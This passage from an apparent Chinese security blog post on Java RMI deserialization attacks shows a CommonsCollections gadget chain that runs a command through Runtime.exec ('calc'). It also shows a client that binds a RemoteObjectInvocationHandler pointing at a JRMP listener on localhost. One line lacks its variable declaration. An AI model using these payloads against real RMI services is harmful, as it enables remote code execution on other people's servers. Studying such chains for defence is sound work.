            MarOutputStream mos = new MarOutputStream(s.getOutputStream());


            try {
                mos.writeObject(generateRemote());
            }catch (Exception e){
                System.out.println("aaa");
            }

        }

    }

    public static Remote generateRemote() throws Exception {

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[0]}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}),
        };

        Transformer transformer = new ChainedTransformer(transformers);

        HashMap hm = new HashMap();

        Map lm = LazyMap.decorate(hm, transformer);


        Constructor constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);

        constructor.setAccessible(true);

        InvocationHandler invo = (InvocationHandler) constructor.newInstance(Target.class, lm);

        Map proxy = (Map) Proxy.newProxyInstance(simulationRmi.class.getClassLoader(), new Class[]{Map.class}, invo);


        constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);

        constructor.setAccessible(true);

        InvocationHandler obj = (InvocationHandler)constructor.newInstance(Target.class, proxy);

        Remote remote = Remote.class.cast(Proxy.newProxyInstance(Server.class.getClassLoader(), new Class[] {Remote.class}, obj));

        return remote;
    }
}
```

给目标发送 ```RemoteObjectInvocationHandler``` 序列化对象

```java
import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObjectInvocationHandler;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

/**
 * Created by haby0
 */
public class Client {

    public static void main(String[] args) throws Exception{

        Registry registry = null;
        try {
            registry = LocateRegistry.getRegistry("127.0.0.1",1099);

            registry.bind("ffff", generate());

        } catch (RemoteException e) {
            e.printStackTrace();
        }
    }

    public static Remote generate(){

        ObjID oi = new ObjID(0);

        TCPEndpoint te = new TCPEndpoint("127.0.0.1", 8899);

        LiveRef lr = new LiveRef(oi, te, false);

        UnicastRef us = new UnicastRef(lr);

          roih = new RemoteObjectInvocationHandler(us);

        Remote rm = (Remote) Proxy.newProxyInstance(Client.class.getClassLoader(), new Class[]{Remote.class}, roih);

        return rm;
    }
}
```

## **参考**

https://xz.aliyun.com/t/7264